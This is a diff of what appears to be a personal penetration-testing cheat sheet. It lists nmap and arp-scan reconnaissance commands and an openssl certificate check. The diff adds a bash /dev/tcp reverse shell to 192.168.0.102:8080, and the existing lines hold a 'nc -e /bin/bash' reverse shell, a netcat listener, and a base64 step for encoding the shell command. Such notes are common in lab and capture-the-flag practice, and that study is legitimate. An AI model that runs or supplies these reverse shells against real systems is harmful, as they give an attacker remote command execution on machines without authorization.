@@ -3,6 +3,10 @@ openssl s_client -connect 192.168.0.102:443 -showcerts ( ssl checker)
 nmap -sT -v 192.168.0.102 -sC -sV  -T4 :::: nmap -T4 -p- -sC -sV -sT -A -Pn 172.16.86.153 ::::  nmap -sC -sV -sS -p- -v -oN nmap_full_scan 192.168.0.106 
 
 arp-scan -l (giong netdiscover)
+
+bash -i >& /dev/tcp/192.168.0.102/8080 0>&1
+
+
 nc -e /bin/bash 192.168.10.10 4444 
 nc -lvnp 4444
 echo 'nc -e /bin/bash 192.168.10.10 4444' | base64 (put_your_encoded_string_here)
